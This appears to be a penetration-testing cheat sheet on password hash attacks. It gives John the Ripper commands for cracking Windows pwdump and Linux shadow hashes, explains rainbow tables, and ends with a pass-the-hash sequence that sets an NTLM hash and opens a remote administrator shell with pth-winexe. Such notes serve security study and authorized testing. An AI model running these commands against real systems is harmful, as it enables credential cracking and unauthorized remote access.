Password Attacks - Hash Attacks


Identify a password hash 

Using samples: http://openwall.info/wiki/john/sample-hashes

Look For: 
	•	Length of the hash 
	•	Character set used in the has
	•	Special characters that may be present in the hash
	•	
Using hash-identifier:  root@kali:~# hash-identifier



Cracking the Hashes

Windows:

Using John the Ripper (bruteforce): root@kali:~# john 127.0.0.1.pwdump

Using John The Ripper (Wordlist): root@kali:~# john --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump

Using John The Ripper (Worldlist with Rules): root@kali:~# john --rules --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump


Linux:

Combine the passwd and shadow files from the system: 

root@kali:~# unshadow passwd-file.txt shadow-file.txt > unshadowed.txt

root@kali:~# john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt



Rainbow Tables

Info: 
Hashes with their corresponding clear-text passwords stored in a binary database. 
More likely to work on Hashes that do not have a salt. 



Passing the Hash (PTH)

Info: 
Allows an attackers to authenticate to a remote target by using a valid combination of username and NTML/LM hash rather than a cleartext password. 
This is possible as password hashes are not salted and remain static between session and computers whose combination of username and password is the same.

Set an environment variable called SMBHASH

root@kali:~# export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896

Authenticate using the password hash and gain a remote command prompt on the target machine

root@kali:~# pth-winexe -U administrator //10.11.01.76 cmd
















